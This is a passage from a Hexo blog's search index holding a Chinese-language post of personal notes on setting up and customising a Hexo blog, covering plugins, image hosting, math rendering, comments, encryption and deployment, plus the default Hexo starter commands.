operator">--</span>save</code></pre></li><li><p>根配置</p><pre class="language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">search</span><span class="token punctuation">:</span><span class="token key atrule">path</span><span class="token punctuation">:</span> search.xml<span class="token key atrule">field</span><span class="token punctuation">:</span> post</code></pre></li></ul><h3 id="文章发布降序排序">文章发布降序排序</h3><ul><li>主目录配置文件<imgsrc="https://s2.loli.net/2023/02/17/qmRPTDsIfAr2bdn.png"alt="image-20230217061701591" /></li><li>文章发布格式<imgsrc="https://s2.loli.net/2023/02/17/9RonXdjBSqW713P.png"alt="image-20230217062016204" /></li></ul><h3 id="picgosm.mstypora-写作">picgo+sm.ms+typora 写作</h3><ul><li>picgo 下载app</li><li>选择图床sm.ms,将sm.ms的sceret token 写入相应图床配置</li><li>备用网址：smms.app（这个不用代理）</li><li>设置代理</li><li>设置时间戳重命名（到此足够了）</li></ul><h3 id="重新部署在了github上">重新部署在了github上</h3><ul><li>没有像在gitee Page上那样要部署</li><li>github 配置<imgsrc="https://cdn.jsdelivr.net/gh/Jf710001011/pictureBed@main/img/202303131824353.png"alt="image-20230313182403309" /></li></ul><h3 id="prism_plugins报错">prism_plugins报错</h3><ul><li>Plugin load failed: hexo-prism-plugin <imgsrc="https://s2.loli.net/2023/02/17/NE7hcVqnsFjHgkO.png"alt="image-20230217031629684" /></li><li></li></ul><h3 id="魔改myblog">魔改Myblog</h3><ul><li>dark theme(mainly css style)<imgsrc="https://s2.loli.net/2023/02/12/5QOFaZJkSuKlG2c.png"alt="image-20230212195537581" /></li></ul><h3 id="增加数学公式支持">增加数学公式支持</h3><p><a href="https://zhuanlan.zhihu.com/p/105986034">zhihu</a></p><ul><li><p>安装hexo-math</p></li><li><p>命令安装pandoc</p><ul><li>exit code 报错</li><li>官网手动安装pandoc（两种安装都需要）</li></ul></li><li><p>配置文件：（版本统一）</p><ul><li>(<strong>主题</strong>目录下)<imgsrc="C:\Users\22514\AppData\Roaming\Typora\typora-user-images\image-20230217015337303.png"alt="image-20230217015337303" /></li></ul><figure><imgsrc="C:\Users\22514\AppData\Roaming\Typora\typora-user-images\image-20230217015431115.png"alt="image-20230217015431115" /><figcaption aria-hidden="true">image-20230217015431115</figcaption></figure><ul><li>博客主目录下<imgsrc="C:\Users\22514\AppData\Roaming\Typora\typora-user-images\image-20230217015730674.png"alt="image-20230217015730674" /></li></ul></li><li><p>出现各种报错</p><ul><li>使用hexo-math.而不是hexo-renderer-mathjax</li><li>使用pandoc</li></ul></li></ul><h3 id="搭建指导">搭建指导</h3><blockquote><ol type="1"><li>参考 https://www.bilibili.com/video/BV1Np4y1i7r5?t=931</li><li>参考hexo官网</li></ol></blockquote><h3 id="注意事项遇到的问题">注意事项(遇到的问题)</h3><blockquote><ol type="1"><li>我的错误：要使用hexo命令，必须进入hexo所在文件夹，否则hexo前+npx。</li><li>“npm hexo sever”中的sever被我一直拼写成server</li><li>每次在本地的更改，需要重新部署，并且等一会才能看到生效。</li><li>在hexo博客中插入图片问题：直接使用markdown语法并不能生效，最快办法，安装插件<ahref="https://github.com/boboidream/hexo-easy-images"class="uri">https://github.com/boboidream/hexo-easy-images</a></li></ol></blockquote><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your veryfirst post. Check <a href="https://hexo.io/docs/">documentation</a> formore info. If you get any problems when using Hexo, you can find theanswer in <ahref="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> oryou can ask me on <ahref="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><hr /><h3 id="create-a-new-post">Create a new post</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span class="token builtin class-name">.</span></code></pre><p>More info: <ahref="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="run-server">Run server</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="generate-static-files">Generate static files</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ hexo generate</code></pre><p>More info: <ahref="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="deploy-to-remote-sites">Deploy to remote sites</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ hexo deploy</code></pre><p>More info: [Deployment</p><h3 id="添加樱花飘落效果">添加樱花飘落效果</h3><blockquote><p>参考博文<ahref="https://blog.csdn.net/victoryxa/article/details/105841440"class="uri">https://blog.csdn.net/victoryxa/article/details/105841440</a>如何关闭</p></blockquote><ul><li>新建sakura.js<imgsrc="https://s2.loli.net/2023/02/17/owVZ9jXSE8Tr7Wg.png"alt="image-20230217204157140" /></li><li>layout.ejs：注意文件路径，插入位置，<code>body</code>内，且不能被包裹在其他原是并列的内容里<imgsrc="https://s2.loli.net/2023/02/17/2hN6DKB79bXminf.png"alt="image-20230217204443683" /></li><li>matery 配置<imgsrc="https://s2.loli.net/2023/02/17/ZzykbqJnc3BL76R.png"alt="image-20230217204519107" /></li></ul><h3 id="文章加密">文章加密</h3><blockquote><p>hexo-blog-encrypt插件：使用主题自带的加密功能，输入密码后仍然一直无法打开文章，故使用了该插件（两种功能选择一种），直接选择快速使用，有明显缺陷。</p></blockquote><h3 id="添加评论功能">添加评论功能</h3><blockquote><p>valine: <a href="https://www.leancloud.cn/"class="uri">https://www.leancloud.cn/</a>，<code>不需要登录</code> 1.LearnCloud网站：<a href="https://www.leancloud.cn/"class="uri">https://www.leancloud.cn/</a> 2. valine: <ahref="https://valine.js.org/quickstart.html"class="uri">https://valine.js.org/quickstart.html</a></p></blockquote><h3 id="视频加载不出来">视频加载不出来</h3><h3 id="markdown">markdown</h3><ul><li><p>代码高亮 &gt; 关键字：c++-&gt;cpp</p></li><li><p>注释使用<code>;</code></p></li></ul><p><strong>备用资源要么注释，要么草稿</strong></p><h3 id="图床">图床</h3><blockquote><p>typora + picgo + <a href="https://sm.ms/">官方网站</a></p></blockquote><p><strong>图片使用JPG</strong></p><h3 id="部署失败问题">部署失败问题</h3><blockquote><p>删除项目下的 <code>.deploy_git</code></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Technique </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
